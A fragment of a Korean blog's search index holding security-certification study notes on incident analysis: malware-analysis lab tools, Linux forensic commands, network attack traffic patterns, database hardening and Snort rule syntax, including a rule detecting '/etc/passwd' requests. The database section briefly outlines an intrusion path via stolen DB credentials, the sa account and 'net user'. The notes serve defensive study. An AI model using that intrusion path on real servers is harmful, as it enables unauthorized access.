        "excerpt":"윈도우 해킹프로그램 분석     해킹프로그램 분석            분석환경 구성                    최소 2개 이상의 가상서버를 구동 (물리적 서버 필요)                            Virtual Box               VMWare Workstation Pro                                   가상서버                            가상네트워크를 일반네트워크와 똑같이 구축 (Samba, HTTP, FTP 등 제공)               가상 서버 OS 를 리눅스로 구축                                    악성프로그램에 취약하지 않음                                               가상 서버 OS 를 윈도우로 구축 (피해시스템 - 해킹프로그램을 실행하는 서버)                                   해킹프로그램이 실행될 때 시스템 파일에서 발생되는 내용과 레지스트리에서 발생하는 내용을 모니터링하는 프로그램 필요           테스트 후 이전 상태(초기상태)로 복구되어야 함                            VMWare 의 Snapshot 기능을 이용                                   물리적 서버 (VMWare 서버)                            DHCP               외부관리프로그램                                   리눅스 서버 (가상서버) - 서비스제공                            Samba               DNS Server               Routing S/W               HTTP Server               SMTP Server               POP3 Server               IRC Server               Network Monitoring S/W                                   윈도우 서버 (가상서버) - 피해대상                            악성코드 실행서버               파일시스템 모니터링               사용자정보 모니터링               레지스트리 모니터링               서비스항목 모니터링               공유폴더 모니터링               시스템항목 모니터링               네트워크항목 모니터링                                               sysAnalyzer 도구                    http://sandsprite.com/iDef/SysAnalyzer           System에서 악성코드가 구동되는 동안 변경된 정보 수집, 비교, 분석하는 자동화된 툴           스냅샷을 비교하여 어떤 것이 바뀌었는지 비교                            Delay               Sniffit Hit : IRC/HTTP 접속정보               API Logger : 바이너리에 Injection 되는 DLL 이 어떤 것이 호출되는지 확인               Directory Watcher : 모니터링 되는 시점에서 생성되는 모든 파일 확인               시점별로 실행된 프로세스 확인               악성코드에 의해 오픈된 포트               explorer.exe 로드된 DLL 파일               커널에 로드된 모듈               변경 / 생성된 레지스트리 키                                               Malcode Analysis Pack                    악성코드 조사           Shell Ext : 문자열 확인           SocketTool : TCP 클라이언트 모니터링           MailPot : 메일서버 캡처 프로그램           fakeDNS : 스푸핑 미니 DNS 서버 프로그램. 악성프로그램이 접속하는 도메인을 다른 곳으로 유도하는 프로그램           Sniff_Hit : HTTP, IRC, DNS 스니퍼           sclog : 악성코드에서 사용하는 쉘코드 분석           GdiProcs : 숨겨진 프로세스 탐지           Shellcode2Exe : 인코드된 쉘코드로 변환하는 php 스크립트 프로그램 (3:27)                       모니터링 프로그램 활용                    파일 모니터링 : Filemon           레지스터 모니터링 : Regmon           CPU성능 모니터링 : Cpumon           네트워크 모니터링 : TCPView, TDImon           프로세스 모니터링 : procexp           스냅샷 모니터링 : Winanalysys           API 함수 추적 : API SPY           네트워크 트래픽 분석 : ethereal                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 침해사고","해킹 프로그램"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-WindowsHackingTools/",
        "teaser": null
      },{
        "title": "정보보안 - 리눅스 사고 분석",
        "excerpt":"리눅스 침해사고 분석     기본 정보 수집            OS 종류, 커널 버전       사용 용도       운영중인 서비스       네트워크 접속 현황       보안 패치 적용 현황       네트워크 구성 형태 및 보안 장비 운영 현황           휘발성 정보 수집            프로세스 확인                    ps -ef                            process 실행자               PID               실행 일시               프로세스명                                   lsof : List open file                            System 에서 동작중인 Process 에 의해서 열린 파일들에 대한 정보를 보여주는 명령               ps 명령어가 변조된 경우 공격자가 구동시킨 프로세스를 볼 수 없음                                               네트워크 상태                    netstat -an                            현재 시스템의 네트워크 연결 상태 확인               발신지 주소 확인                                   nmap : network mapper                            네트워크 보안 유틸리티               대규모 네트워크를 고속으로 스캔                                    -sT : tcp 스캔                   -p : 특정 포트 점검                   nmap -sT -p [포트번호] [ip주소]                                                                   fuser                            어떤 프로세스에서 포트를 열었는지 확인               현재 사용중인 파일, 소켓이 사용하는 프로세스 확인               fuser 6001/tcp                                    위 명령어의 결과 (예:pid 6333) 를 활용해 ps [pid] 명령어 사용                                                                               사용자 로그인 상태                    w                            현재 시스템에 성공적으로 로그인한 사용자에 대한 Snapshot 제공                                    해당 사용자 목록 중에 w 명령어에 없는 (성공적으로 로그인) 사용자는 백도어를 이용했을 확률이 있음                                               사용자들이 어디에서 로그인을 했는지, 어떤 작업을 하는지 알 수 있음               utmp : 정보 파일                                               공격자를 규정하기 위해 자세히 봐야할 정보                    접속 계정이 정상적인지 확인           접속출처가 정상 위치인지 확인 (내부 IP 주소 이외에 접속, 국외 IP 주소 접속 등)           접속 사용자의 정상적인 행위인지 확인 (Scan 도구 사용, 다른 서버에 서비스거부공격 등)                       프로세스 확인, 네트워크 상태를 확인해 시스템의 상황을 파악하고 공격자의 단서를 찾음, 이후 세부사항 확인           상세분석            패스워드 파일 분석                    /etc/passwd                            관리자 권한을 가진 계정이 있는지 확인 : uid=0                                    user1:x:0:0::/home/user1:/bin/bash                                               새로 생성된 계정이나 패스워드가 없는 계정 확인                                               로그 파일 분석                    사고가 일어난 뒤의 로그는 100% 신뢰할 수는 없다. 하지만 흔적은 어딘가에 남아있다.           로그파일 생성일자, 변경일자 확인           공격자는 공격을 통해 발생하는 시스템로그, 접속로그등을 삭제/변경함           주요 로그 파일                            utmp : 현재 시스템에 로그인한 사용자의 정보               wtmp : 과거에 로그인했던 사용자의 정보               messages : 시스템 장애 정보 + 공격으로 인한 정보                                   웹로그 파일                            access_log                                    Host (도메인,IP주소) : 웹서버에 접속한 IP 주소                   Identification : 사용자의 이름, - 로 표시                   User Authentication : (사용자 인증이 된 경우) 패스워드가 표시되는 부분                   Time Stamp : 방문자가 접속한 시간 (GMT - 그리니치 표준시 포함)                   HTTP Request                                            사용자 접속한 방식 (POST, GET)                       접속파일                       HTTP 버전                                                           Status : 사용자가 요청한 내용을 처리한 결과                                            200 : Success                       3xx : Redirection                       4xx : Client Error                                                    404 : NotFound                                                                       5xx : Server Error                                                           Transfer Volume : 요청한 파일의 용량, 없는 경우 0 또는 - 로 표시                                               access                                               루트킷 확인                    Rootkit : 정상적 프로그램을 변조시킴 (주로 바이너리 파일)                            ls, ps, netstat, login, top, dir, du, ifconfig, find, tcpd …               ls 명령어를 변조시켜 공격자가 만든 파일이 보이지 않도록 함                                   시스템 프로그램 파일크기, 생성시간, 변경시간 확인           /bin, /usr/bin 디렉토리 에서 ls -alct | more 명령을 통해 다른 프로그램이 기본적으로 설치된 시간과 다른 것이 있는지 확인 -&gt; 파일사이즈 비교                            ls                                    -a : all - 숨겨진 파일, 디렉토리를 보고자 할때                   -l : long - 자세한 내용을 출력. 권한, 파일 수, 소유자, 그룹, 파일크기, 수정일자 등                   -c : ctime - 변경시간                                            MAC : mtime (수정), atime (접근), ctime (변경)                       기본값 mtime 으로 출력                       -u : atime                                                           -t : 시간순 정렬                   -S : 파일 사이즈 순 정렬                                                                   무결성 검사 (리눅스) : rpm -Va                            s.5.....GT /bin/df                                    s : 프로그램 사이즈 변경                   5 : md5 checksum 값 변경                   T : vkdlfdml mtime 값 변경                   G : group 변경                   u : user 변경                   c : 설정파일 변경                                                                   무결성 검사 (솔라리스) : fingerprint                            검사하고자 하는 파일의 checksum 값을 만들어 비교                                   strace : System 콜 추적                            예) ps 명령어 추적 : strace -e trace=open ps|more                                    결과가 open(\"/usr/lib/locale/ro_RO/u~/procre) 이라고 나왔을 경우 ps 가 해당 파일을 참조                                            공격자가 숨기고 싶은 파일을 해당 파일에 등록                                                                                                                       해킹 관련 파일 조사                    피해 시스템에 공격자가 어떤 작업을 했는지 알아보기 위한 절차                            타 시스템 스캔               공격 프로그램 설치               IRC 서버 설치               로그 삭제               스니퍼 프로그램 설치                                   새롭게 생긴 파일 찾기                            find 명령어를 이용해 최근 수정된 파일, 생성된 파일 찾기                                    변조를 감추기 위해 시간을 수정하는 경우 inode 변경시간 체크                   수정일 7일 이내인 파일 찾기                                            find [폴더] -type f -mtime 일수 -print                                                           최근 5일동안 수정되거나 새롭게 생성된 파일을 찾아서 /var/aaa/test.out 파일에 저장                                            find / -ctime -5 -print &gt; /var/aaa/test.out                                                           setuid, setgid                                            find / -user root -perm -4000 -print &gt; suidlist                       find / -user root -perm -2000 -print &gt; sgidlist                                                                                                           /usr, /var, /dev, /tmp 디렉토리 안 파일 검사                            /dev 폴더 안 디바이스파일 이외의 일반파일이 있는 경우                                    find /dev -type f -print                                                                   . , .. 으로 시작하는 디렉토리                            ls 명령어를 옵션 없이 사용시 비노출 (숨겨진 디렉토리)                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","리눅스 침해사고","초기 분석","상세 분석"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-LinuxInitialResponse/",
        "teaser": null
      },{
        "title": "정보보안 - 네트워크 침해사고",
        "excerpt":"네트워크 침해사고     사고 유형별 데이터 수집            불법적인 자원 사용                    호스트 불법 사용 : 액세스로그, ps 상태, CPU 사용률, 파일 저장공간 상태           네트워크 대역폭 불법사용 : 회선상태, 송수신 패킷 수, IP주소, 프로토콜 사용현황, 스위치 포트 상태           메일 프록시 서버의 불법 Relay : 호스트 애플리케이션 로그, 프로세스 상태정보, 네트워크 IP주소, 프로토콜 사용현황                       DoS : 서버의 자원소모를 통한 서비스 중단                    서비스 자원소모를 통한 서비스 중단 / 불안정                            호스트 : 프로세스 상태정보, CPU 사용률, 비정상적인 패킷 로그               네트워크 : 회선상태, 비정상적인 패킷개수, IP주소, 비정상적인 패킷내용                                   네트워크 대역폭 과도한 점유를 통한 통신 중단 / 불안정                            네트워크 : 송수신된 패킷 개수, IP주소, 프로토콜 사용현황, 데이터 내용                                               데이터 손상 및 변조                    변조의 종류                            웹페이지 변조               데이터파일 변조               프로그램 파일 변조                                   호스트 : 액세스 로그, 파일/저장장치 상태, 환경파일 내용           네트워크                            IP주소, 프로토콜 사용현황, 데이터 내용, 스위치 포트 상태                                               정보 누설                    통신가로채기, 비공개자료 누설           호스트 : 액세스 로그, 파일/저장장치 상태           네트워크 : IP주소, 프로토콜 사용현황, 데이터 내용, 스위치 포트 상태                           네트워크 트래픽 (패킷) 정보 분석 방법 (공통적으로 수집해야 할 정보)            분석 솔루션 / 툴                    MRTG           NMS (Network Management System)           Firewall           IDS           라우터 / 스위치 장비 명령어           Ethereal                       네트워크의 정보                    대역폭 사용량           트래픽을 대량으로 발생시키는 IP 주소           내부 사용자의 IP 주소           서버의 IP 주소           TCP/UDP 별 사용 현황           라우터, 스위치 트래픽 발생 현황                           프로토콜 개요            IPv4                    Version(4) / Header Length(4) / Type of Service(8) / Total Length(16)           Identification(16) / Flags(3) / Fragment Offset(13)                            Flags(3bit)                                    0 Bit : 0으로 설정                   1 Bit : 0 (큰 패킷에 대한 조각), 1 (조각을 허용하지 않음)                   2 Bit : 0 (해당 패킷이 마지막 조각), 1 (마지막이 아님)                                                                   Time to Live(TTL)(8) / Protocol type(8) / Header Checksum(16)                            Time to Live(TTL)                                    해당 패킷이 최대로 통과할 수 있는 라우터 홉수 (전송수명)                   0이 되면 해당 패킷은 소실 - ICMP 프로토콜을 사용해 송신 시스템에게 에러가 발생함을 통보                                               Protocol type                                    전송계층의 프로토콜을 표시                   ICMP : 1                   TCP : 6                   UDP : 17                                                                   Source Address(32)           Destination Address(32)           Option / Padding           Data(32)…                       IPv6 : 기존 14개 헤더에서 8개 헤더로 줄어듦                    Version(4) / Traffic Class(8) / Flow Label(20)           Payload Length(16) / Next Header(8) / Hop limit(8)           Source Address(128)           Destination Address(128)                       TCP : 시스템과 네트워크를 연결해주는 가장 중요한 계층                    20 Bytes Header                            Source Port number(16) / Destination Port number(16)                                    Port : 0 ~ 65535                                               Sequence number(32)                                    송신자가 전송하는 데이터의 TCP Segment 번호                                               Acknowledgement number(32)                                    송신자가 해당 패킷을 수신한 호스트로부터 다음에 받아야 하는 패킷의 TCP Segment 번호                                               header length(4) / 예비(6) / TCP Control Flag(6) / Window size(16)                                    TCP Control Flag : 패킷의 용도를 표시                                            URG : 긴급                       ACK : 응답패킷                       PSH : 세그먼트를 메모리에서 합성하지 않고 애플리케이션에 바로 전달                       RST : 해당 세션을 강제로 종료                       SYN : 초기에 접속을 시작하는 경우 사용, Sequence Number, Window Size 명시                                                    SYN (100) -&gt; SYN (1) + ACK (101) -&gt; ACK (2)                                                                       FIN : 해당 세션을 정상적으로 종료                                                                                                                                                                                    FIN (100) -&gt; ACK(100+1)                                   FIN, ACK(1) -&gt; ACK(2)                                                                                                                                                                                                                                   Window size : 버퍼크기, 운영체제나 응용프로그램에 따라 다름.                                            너무 큰 세그먼트의 크기를 줄이라고 통보                       네트워크 웜의 경우 TCP Window의 크기가 일정하게 고정됨                                                                                       TCP Checksum(16) / urgent pointer(16)                                   Options           Data                           패킷 수집 및 디코드            트래픽과 패킷 수집                    목적 : 외부 침입과 공격을 확인하기 위함                       패킷 측정 구간                    목적에 따라 위치가 달라질 수 있음                            WAN - Router - F/W - LAN/WLAN …                                    기본 : 라우터와 가까운 위치에 센서를 설치                   F/W : NAT (Network Address Transition) : 사설IP &lt;–&gt; 공인IP 일 경우 방화벽 앞 뒤로 센서를 설치                                            같은 시간대에 세션을 찾아서 동일한 패킷들로 분석                                                           네트워크 웜 (IP 를 변조) 분석                                            내부 네트워크 전 구간이 측정대상이 될 수 있음                       백본, 주요 액세스 스위치의 포트 트래픽, CPU 상태 관찰 필요                       대부분의 네트워크 공격은 내부에 있는 호스트가 서로 공격하도록 하는 DDoS 방법 이용 (22:38)                                                                                                                       패킷 수집                    캡쳐 기능을 이용해 버퍼나 파일로 저장                            일정 개수의 파일을 항상 유지                                    약 24-32MB 정도의 용량                   패킷 수집구간에서 발생하는 트래픽과 패킷저장에 필요한 시간을 계산해서 설정                                               항상 최근의 패킷들만 포함 (Ring Buffer)               언제 어떤 사고가 발생할지 알 수 없기 때문에 항상 일정시간 동안의 트래픽 정보와 패킷을 보관                                   실제 사용자들의 Data 가 필요하지 않을 때 패킷의 Header 부분만 캡쳐                            모든 패킷의 시작부분에서 일정한 크기만큼만 캡쳐                                               트래픽 통계 관찰 - 분석기, NMS 나 시스템 내부 명령어를 통해 관찰                    MAC 주소별 트래픽 통계                            사용자들이나 서버들이 연결된 액세스 스위치 구간에서는 호스트별 MAC 주소를 확인, 트래픽 발생 상태를 관찰                                   IP 주소별 트래픽 통계                            대부분 침입, 공격은 IP 기반               IP 주소별로 모든 트래픽 통계를 분리 관찰 필요               네트워크에서 웜이 활동하거나 DDoS 가 발생한 경우                                    내부 IP 주소에서 전송하는 패킷 개수가 수신하는 패킷 개수보다 훨씬 많음                   패킷 개수에 비해서 송수신되는 Byte 수가 적음                                                                   TCP/UDP 세션별 트래픽 통계                            어느 세션이 서버에서 몇 분 동안 작업을 했는지, 어느정도의 패킷이나 데이터가 송수신되었는지 확인                                               패킷 디코드                    패킷 컬럼                            Time (Relative Time) : 기준 패킷으로부터 상대적인 시간차               Delta Time : 시간 간격 - 바로 이전 패킷과 해당 패킷사이의 간격               Abs.Time : 패킷이 캡쳐된 실제 시스템 시간               Source : 패킷 송신 호스트의 주소 (IP or MAC)               Destination : 패킷 수신 호스트의 주소 (IP or MAC)               Length : 실제 패킷의 크기                                    CRC (Cycle Redundancy Check) : 순환중복검사, 네트워크 오류 체크 값을 얻어내는 방식                                            데이터 전송 전에 데이터 값에 따라 CRC 계산, 값을 Data 에 붙여넣어 전송                       H/W 방식 (직렬데이터-CRC:비트단위 출력) 과 S/W (병렬데이터-CRC:Octet-8비트 단위 출력) 방식이 있음                       오류를 검출하는 데 탁월하나, 수정이 쉬워 데이터 무결성 검증은 할 수 없음.                                                           CRC 값이 Length 에 포함될수도 안될수도 있음                                               Protocol               Info : 송수신포트, 패킷의 용도, 애플리케이션의 설명, 패킷의 Seq 번호, Ack 번호, TCP Window size 등                                   패킷 헤더           패킷 데이터                            16진수 혹은 ASCII 코드                                                   공격형 트래픽의 특징            특정 서버만을 공격하는 패턴                    Web 서버, E-mail 서버, DNS 서버 등 (Application 서버) 을 공격                            패킷의 크기가 크거나 불규칙               해당 서버에서 인식하지 못하는 코드를 전송               해당 서버에서 처리할 수 없을 정도의 많은 요청을 보냄               서버에서 허용되지 않는 문장을 사용해서 요청 패킷을 전송                                   애플리케이션 서비스 중단                            서비스 중단 코드를 서버에 삽입 : Buffer Overflow 공격 &gt; 네트워크 과부하 발생 공격 (발전된 공격형태)                                               네트워크에 과부하를 발생시키는 공격 패턴                    스위치, 방화벽, 라우터 등에 영향                            영향을 주는 트래픽을 찾는 것은 쉬우나, 발생시키는 호스트를 찾는 것이 어려움 (IP 변조)                                   네트워크 과부하 발생 트래픽의 특징                            불특정 IP 주소를 순차적으로 사용하여 특정 한 개의 IP 주소 대상으로 같은 형태의 패킷이 발생               특정 IP 주소에서 불특정 다수의 IP 주소 대상으로 순차적으로 같은 형태의 패킷이 발생               1초에 송신하는 패킷의 개수가 수백에서 수만개 까지 발생               한 개 또는 몇 개의 TCP 포트를 대상으로 SYN 패킷을 전송               발생하는 패킷의 크기가 작음               패킷의 개수가 수신보다 송신이 매우 많음 (100-1000배 이상)                                   침입형 트래픽의 특징                            목적지를 알고있는 상태인 경우 접속이 가능한 포트를 검색하여 접속을 시도 (여러 방법, 도구) 함               목적지를 모르는 경우 네트워크를 통해 IP 와 포트를 검색해야 함               해당 IP 주소에서 송신한 패킷 개수와 수신한 패킷 개수가 비슷함               일반적으로 검색과정에서는 실제 데이터 송수신이 발생하지 않기때문에 송수신한 바이트 수도 비슷함               패킷 가운데 RST 나 login Failure 가 포함된 패킷이 많음               검색하려는 IP 주소 또는 포트가 순차적으로 바뀜                                   일반적인 침입과정                            공격자                                    침입자 -&gt; Target : IP Scan                                            Ping 명령어 이용하여 검색                                                    Echo Request - Echo Reply (호스트 있을 경우)                                                                                                           침입자 -&gt; Target : 호스트 정보검색 (취약점)                   침입자 -&gt; Target : 취약점을 이용한 호스트 공격                                            관리자 권한 획득, Data 삭제, 백도어 설치, 자원의 불법사용, 보안정보 유출                                                                                       Target                                    IP Scan 검사 : 침입자의 IP 주소, 검사시간 확인                   Port 검사                   침입자의 명령어 검사, 코드 검사                   침입자의 데이터 송수신 상태 검사                   불법적인 통신 상태 검사                                                                               예시                    MS Blaster 패턴                            Window 계열 운영체제를 통해 확산된 웜 (Blaster Worm) - 2003년 전파               여러 IP 에서 한 IP 주소에 패킷을 보냄               짧은 Delta time, 많은 SYN 패킷 전송                                   Gabot 패턴                            한 IP 주소에서 여러 IP 에 패킷을 보냄               짧은 Delta time, 많은 SYN 패킷 전송                                   IP Scan 패턴                            Echo Request 사용 (Ping)                                   Port Scan 패턴                            TCP 포트 검색, 포트를 순차적 검색               대상 Host 에서 연결을 거부할 경우 RST 패킷이 발생                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크 침해사고"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-NetworkIntrusion/",
        "teaser": null
      },{
        "title": "정보보안 - 데이터베이스 침해사고",
        "excerpt":"데이터베이스 침해사고     Data, 데이터베이스, DBMS            데이터와 정보                    데이터 : 정보작성을 위한 필요자료, 특정목적에 대해 평가되지 않은 상태, 단순한 사실           정보 : 데이터를 추출, 분석, 비교 등의 가공절차를 통해 의사결정, 행동을 할 수 있는 의미있는 데이터                       데이터베이스 : 데이터의 집합, 여러 응용시스템이 공유. Integrated, Stored, Operational       DBMS : 데이터를 통합적으로 생성, 관리, 저장하는 소프트웨어. MySQL, MSSQL, ORACLE, DB2 등                    MySQL 서버가 침해사고의 대상이 되는 경우가 많음. (PHP)                           MySQL 점검 항목            관리자 아이디를 default 로 사용하는지 점검                    기본 패스워드 값은 누구나 알고 있음           무차별대입 / 사전대입 공격 - 추측 어려운 패스워드를 사용해야 함           mysql -uroot -p                       패스워드 설정 안된 계정 존재하는지 점검                    select user, password from user           update user set password = [] where user = []           flush privileges; : 변경사항을 즉시 반영                       Remote 에서 MySQL 서버로 접속이 가능한지 점검                    기본 포트 : 3306/tcp                            my.cnf 파일의 [mysqld] 에 skip-networking 추가 : 로컬 접속만 가능                                               MySQL 계정을 이용한 접속 가능한지 점검                    /etc/passwd 의 쉘 부분을 /bin/sh 대신 /bin/false 로 변경하여 원격 접속을 차단                       시스템 사용자들의 DB에 대한 권한 설정이 올바른지 점검                    필요 이상의 권한을 부여하지 않아야 함           select * from DB;           불필요한 권한을 Revoke 시킴           update db set update_priv = 'N' where db=[]           flush privileges;                       데이터베이스 내의 사용자별 접속/권한 설정이 올바른지 점검                    dba 가 아닌 일반 user 가 중요 table 을 조작할 수 있음           select * from user;                                                                                                            Host                       User                       Password                       Select_priv                       …                       Process_priv                       File_priv                                                                                       File_priv : 파일에 대한 권한               Process_priv : 쓰레드 정보 확인 (쓰레드 중지 권한 포함)               Shutdown_priv : MySQL 서버의 실행을 중지시키는 권한                                   localhost 의 root 계정을 사용하지 않고 다른 DBA 계정을 만들어 사용하는 것이 바람직함           원격 Host 에서 root 계정등의 접근설정 확인                            update user set process_priv=\"N\" where host = [ip] and user = \"root\";                                               안정적인 MySQL 버전을 사용하고 있는지 점검       MySQL 의 데이터 디렉터리는 안전하게 보호되고 있는지 점검                    my.cnf 파일에 대한 접근통제도 필요                           MS-SQL 점검 항목            계정의 패스워드 중 빈 패스워드나 약한 패스워드가 존재 하는가?                    select name, password from syslogins; : 결과 NULL 일 경우 패스워드가 없음. 단 Builtin 계정은 NULL 이 정상                       guest 계정이 비활성화 되어 있는가?                    SQL 서버의 Enterprise Manager 를 실행하여 guest 계정 확인, 삭제                       public 데이터베이스 역할이 부여되어 있는가?                    public 역할 : 모든 데이터베이스 사용자들의 표준에 해당되는 역할. 인가를 받지 않은 사용자도 권한을 행사할 수 있는 취약점                       SYSADMIN 그룹의 사용자를 인증된 사용자만으로 제한하고 있는가?                    System Administrator 권한                       방화벽에서 SQL Server 포트를 차단했는지?                    TCP/1433 or 1434                       가장 최신의 서비스 팩을 설치했는가?                    서버 보안을 위함                       Microsoft Baseline Security Analyzer(MBSA) 로 서버를 점검했는가?                    보안패치가 최신으로 유지되는지 확인           보안상 약점이 될만한 설정이 있는지 확인           기본 취약점 점검하는 도구                       SQL Server 연결에 대한 감사를 수행하는가?                    이벤트 정보 로그 기록                       웹서버 확인 필요 항목                    DB 접속 파일 확인                            예 : conn.asp 파일 침해                                    DB 서버의 IP 주소, Host Name                   DB 접근 게정 (ID)                   DB 서버 접근 패스워드 (PW)                                               sqlpoke.exe 프로그램을 업로드, 이용, 위에 획득한 정보로 접속                                   MS-SQL 서버 의 디폴트 계정 중 sa (system admin) 계정 이용                            서버 내부의 Administrator 계정으로 명령어를 전달할 수 있는 계정                                   net user 명령어 사용                            remote 에서 DB 서버에 계정을 생성 가능 (우회적으로 DB서버에 접근)                                   SQL Injection 공격                            IIS 웹로그 등을 통해 침입 흔적을 확인해야 함                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","데이터베이스 침해사고"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-DatabaseIntrusion/",
        "teaser": null
      },{
        "title": "정보보안 - snort",
        "excerpt":"snort     개요            IDS (네트워크 이상징후 감시) 중 하나                    모든 트래픽을 감시하거나 샘플링을 통해 감시           미리 설정값을 저장           DB 와 비교, 알려진 공격 시그니처와 비교           공격자의 침입 경로 Block           사용자의 패턴을 분석해서 이상징후 탐지                       마틴 로시가 1998 년에 sniffer and more 라는 표어 (네트워크 트래픽을 더 많이 감시) 로 개발       프로토콜 검색, 컨텐츠 분석, 웜, 취약점 공격시도 탐지, 포트스캔, CGI           기능            snort 의 운영모드                    Sniffer Mode           Packet Logger Mode           Network IDS/IPS Mode                       패킷 스니퍼                    패킷 스니핑을 통해 계속 화면에 출력 -&gt; 작은 네트워크 규모에서 사용                       패킷 로거                    로그 남기기                       네트워크 IDS/IPS                    네트워크 트래픽 분석을 통한 공격 탐지/차단                           설치            RHEL (CentOS) 기준                    DAQ (Data Acquistion Package) 설치           Snort 패키지 설치                       Talos(제작사) 에서 Ruleset(최근 공격 패턴을 탐지할 수 있는) 을 만들어 배포           Snort 구조            sniffer : 패킷을 보기 좋게 Decode       preprocessor : 비정상 헤더구조 패킷, 트래픽 구분       Detection Engine : Rule 기반의 탐지 엔진, 사전 정의된 Rule 에 매칭 되는지 확인, Payload 확인       Alert / logging : Ruleset 에 일치하는 패킷에 대한 처리방법, SMB, SNMP, trap 등을 활용해 저장       설정값 저장 위치 : /etc/snort/snort.conf                    모니터링하고자 하는 Network 설정           Rules 위치 수정                           Snort 명령어            Sniffer Mode                    TCP/IP 패킷 헤더를 출력 : snort -v           TCP/ICMP/UDP 헤더와 IP를 출력 : snort -vd           패킷 데이터를 추가해서 표현하기 위한 명령어 : snort -vde           -v : snort 를 패킷 sniffing 모드로 변경           -d : 모든 네트워크 계층 포함           -e : 데이터링크 계층의 헤더를 포함           -c : 패킷 검출                           Snort Rule / Signature            Header                    내용                            처리방식               프로토콜               IP주소               포트번호                                   Rule 헤더 설정                            Rule Actions                                    패킷이 탐지되었을 때 처리방식                   8가지 유형이 존재                                            alert : 알람을 발생시키고 로그를 남김                       log : 패킷을 로그에 남김                       pass : 패킷을 무시함                       activate : alert 을 발생시키고, dynamic rule을 활성화                       dynamic : activate rule 에 의해 활성화 되고, log rule 과 동일하게 동작                       drop : 패킷을 차단하고 로그에 남김                       reject : 패킷을 차단하고 로그를 남김, 메시지를 전달                                                    TCP : TCP RST                           UDP : ICMP port Unreachable                                                                       sdrop : 패킷을 차단하지만 로그를 남기지 않음 (silent drop)                                                           Rule 이 매칭 되었을 때 처리방식                                               Protocols                                    탐지할 프로토콜을 설정.                   TCP, IP, UDP, ICMP                                               IP Addresses                                    출발지, 목적지 IP 주소.                   단일 IP, IP대역(CIDR표기), IP 리스트 (구분자:,) 등으로 표기, 부정연산자(!) 표현가능                                               Port Numbers                                    출발지, 목적지 Port                   단일 Port, Port Range (:이용), Port 리스트 표현                                            1:1023 : 1~1023                       :39910 : 1 ~ 39910                                                                                       Direction Operator                                    방향 지시자                                            출발지 -&gt; 목적지 (단방향)                       출발지 &lt;&gt; 목적지 (양방향)                       출발지 &lt;- 목적지 : 이러한 표현은 사용하지 않음                                                                                                           형태 : action protocol ipaddr port direction ipaddr port                            alert tcp any any -&gt; 192.168.59.0/24 80                                    192.168.59 대역의 80 포트에 들어오는 패킷을 탐지                                               log tcp $EXTERNAL_NET any &lt;&gt; $HOME_NET 80                                    외부 네트워크 IP 에서 내부 네트워크 80 포트간 송수신되는 패킷을 탐지                   $EXTERNAL_NET, $HOME_NET : snort.conf 에 정의된 환경변수                                                                               Body : 옵션 설정                    내용                            패킷탐지 규칙을 명시               snort 설정 generator 를 사용하여 간편하게 입력하는 방법도 존재                                   종류                            일반               Payload / 범위 관련               Payload / 정규표현식               Payload / HTTP               이벤트 제한 관련                                   일반 옵션 설정                            msg : alert, log 출력 시 이벤트 명으로 사용               reference : rule 과 관련된 외부 취약점 정보 참조시 사용               sid : 룰 식별자                                    99이하 : 시스템 예약 sid                   100 ~ 1000000 : snort 에서 배포하는 ruleset 에서 사용하는 sid                   1000001 이상 : 사용자가 정의한 rule sid                                               classtype : 공격유형, 기본우선순위(위험도) 정의               priority : 위험도에 대한 숫자, classtype 에서 지정한 우선순위(위험도) 를 덮어씀               rev : revision - rule 수정횟수                                   Payload / 범위 관련 : 범위를 지정해주는 옵션을 사용하면 성능 향상, 오탐을 줄임                            옵션                                    content : Payload 에서 검사할 문자열 설정 (전체 Payload 비교)                                            문자열 설정 시 text, text/binary, binary 형태 중 하나로 설정, 부정연산자 사용 가능                                                    text 형식 : content:\"문자열                           binary 형식 : content:\"|FFFF|문자열\"                                                            FF : 헥사 값 예시                                                                                   text/binary 형식 : content:\"|FFFF|\"                           !(부정연산자) : content:!\"문자열\" - 문자열이 없는 것                           Escape(\\) 처리 필요 문자 : \", ;, \\                                                                                                           uricontent : HTTP Client 의 요청 URI (전체 Payload X) 에서 검사할 문자열 설정                   offset : Payload 에서 Content 문자열을 검사할 시작 위치를 지정                                            Payload 의 첫 번째 바이트 위치는 0 부터 시작                                                           depth : offset 부터 몇 바이트까지 검사할 것인지 지정                   distance : content:\"문자열\" 이 매치된 경우                                            이후부터 몇 바이트 떨어진 위치에서 다음 content를 검사할 것인지 지정                                                           within : content:\"문자열\" 이 매치된 경우                                            distance 부터 몇 바이트 범위 내에서 다음 content를 검사할 것인지 지정                                                           nocase : Payload 검사 시 대소문자를 구분하지 않음 (바이너리 형식도 동일)                                               예시 (29:10)                                    FTP root 로그인 시도 탐지 (제공 Ruleset 사용)                           alert tcp any any -&gt; 10.10.10.0/24 21       (msg:\"FTP root user access\";content:\"USER root\";nocase;sid:100100;)                                                           테스트 (content)                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]content_text\";content:\"/etc/passwd\";nocase;sid:1000020;)                                                           테스트 (offset) - 3번째 바이트부터 (2) 3바이트 이내(2~4)에 5457 문자열이 있는지 확인                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]offset\";content:\"5457\";offset:2;depth:3;nocase;sid:1000030;)                                                           테스트 (distance, within) - 3번째 바이트부터 (2) 5바이트 이내 (2~6) 에서 369 문자열을 찾고, 4바이트 (7,8,9,A) 떨어진 위치 (B) 에서부터 3바이트 이내 (B,C,D) 에서 ABC 문자열을 찾아 만족하면 알림 출력                           alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any       (msg:\"[TEST]distance, within\";content:\"369\";offset:2;depth:5;content:\"ABC\";distance:4;within:3;nocase;sid:1000034;)                                                                                                           Payload / 정규표현식                            정규표현식 : 일정 규칙을 갖는 문자열을 표현하는 방식               옵션 : PCRE (Perl Compatible Regular Expression) - Snort 에서는 Perl 기반 정규표현을 사용                                    pcre=\"/정규표현삭/\"                                               메타문자                                    \\ : escape 문자로 사용 (특수문자 기능 제거)                   ^ : 